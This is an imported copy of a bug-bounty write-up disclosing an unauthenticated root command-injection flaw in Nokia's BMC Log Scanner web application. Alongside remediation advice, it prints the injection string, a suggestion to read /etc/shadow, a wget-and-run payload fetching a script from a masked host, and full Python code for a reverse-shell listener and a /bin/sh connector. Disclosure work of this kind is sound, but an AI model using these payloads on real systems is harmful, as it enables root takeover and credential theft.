---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-18_nokia-vbmc-bmc-log-scanner-remote-code-execution.md
original_filename: 2024-01-18_nokia-vbmc-bmc-log-scanner-remote-code-execution.md
title: Nokia vBMC — BMC Log Scanner Remote Code Execution
category: documents
detected_topics:
- command-injection
- automation-abuse
tags:
- imported
- documents
- command-injection
- automation-abuse
language: en
raw_sha256: 2372dde012f06575e960bad8c3d569f08a70c30f79e2cf1398ad4ce2cc3b2bc7
text_sha256: 20804a554cd96668e7516287655618d9b7bd584680549813bec4792fe1bc675f
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Nokia vBMC — BMC Log Scanner Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-18_nokia-vbmc-bmc-log-scanner-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `2372dde012f06575e960bad8c3d569f08a70c30f79e2cf1398ad4ce2cc3b2bc7`
- Text SHA256: `20804a554cd96668e7516287655618d9b7bd584680549813bec4792fe1bc675f`


## Content

---
title: "Nokia vBMC — BMC Log Scanner Remote Code Execution"
url: "https://mattchew-gregory.medium.com/nokia-vbmc-bmc-log-scanner-remote-code-execution-52421b3f928d"
authors: ["Matthew Gregory"]
programs: ["Nokia"]
bugs: ["RCE", "OS command injection"]
publication_date: "2024-01-18"
added_date: "2024-01-29"
source: "pentester.land/writeups.json"
original_index: 521
scraped_via: "browseros"
---

# Nokia vBMC — BMC Log Scanner Remote Code Execution

Nokia vBMC — BMC Log Scanner Remote Code Execution
Matthew Gregory
Follow
4 min read
·
Jan 19, 2024

41

Note: This write-up was a collaboration between my co-worker (Carlos Andres Gonzalez) and I, which was produced in October of 2022. The delay in posting this write-up comes from ensuring the remediation was completed before publicly disclosing.

Description

The BMC Log Scanner web application, available on several hosts, is vulnerable to command injection attacks, allowing for unauthenticated remote code execution. This vulnerability is especially significant because this service runs as root.

Steps to Reproduce:

In the Search Pattern field, type:

;”;command

Replacing the word “command” above with any Linux command. Root access can be confirmed with the id command or any other command that would require root access, such as displaying the contents of the /etc/shadow file.”

Recommendations

● Ensure that proper input sanitization is in place for all fields that accept user input.

● Services should be run based on the principle of least privilege and not be run with full access to the system unless absolutely necessary.

Demonstration

Initial Command Execution

Entering the command injection string at the BMC Log Scanner GUI on APP host APP-000 port 9988:

Press enter or click to view image in full size

The results of the id command showing that the service is running as the root user:

Press enter or click to view image in full size

From a DB Host

Note that when recreating this scenario from one of the DB hosts, the commands run on both APP servers simultaneously.

Entering the command injection string at the BMC Log Scanner GUI on DB host DB-000.

Press enter or click to view image in full size

The results of the command injection on DB-000 showing that it ran on both APP hosts.

Press enter or click to view image in full size

Obtaining a root Level Shell

This vulnerability can also be used to initiate a reverse shell connection back to one of the Pilot hosts with no access to the App host besides being able to reach the web app. Since the service runs as root, the interactive shell has root privileges on the App host. The process for this is slightly more involved and requires the following steps:

● Write a Python script (see the References section) that will open a port and listen for a connection. Store that on a Pilot host.

Get Matthew Gregory’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

● Start the listener on the Pilot host.

● Write a Python script (see the References section) that will connect to a listener for a reverse shell and store that on a Pilot host.

● Start a Python web server on the Pilot host.

● Enter the following command injection code on the BMC Log Scanner:

● ;”;wget xxx.xxx.xxx.x:8000/connector.py -O /tmp/connector.py;python /tmp/connector.py

The code above will cause the APP server to connect back to the Pilot server to pick up the connector.py script and then run the connector.py script.

Running the listener using the Python3 binary available at /PLATsoftware/bmcp/python/bin/python3:

Press enter or click to view image in full size

Running the web server:

Press enter or click to view image in full size

Entering the command — in this case, the web page simply hung at this screen:

Press enter or click to view image in full size

However, the web server showed that the connector file was picked up:

Press enter or click to view image in full size

And the listener received a connection.The id and ip a commands were run after the connection was established to confirm the machine that the shell was opened from:

Press enter or click to view image in full size

References

The code for the Python3 listener is below:

import socket, sys, time

def listen(ip,port):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((ip, port))
s.listen(1)
print(“Listening on port “ + str(port))
conn, addr = s.accept()
print(‘Connection received from ‘,addr)
while True:

#Receive data from the target and get user input ans = conn.recv(1024).decode() sys.stdout.write(ans)
command = input()

#Send command
command += “\n” conn.send(command.encode()) time.sleep(1)

#Remove the output of the “input()” function sys.stdout.write(“\033[A” + ans.split(“\n”)[-1])

listen(“0.0.0.0”,8001)

The code for connecting to the listener is below:

import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((“xxx.xxx.xxx.xxx”,8001)); os.dup2(s.fileno(),0);

os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([“/bin/sh”,”-i”]);
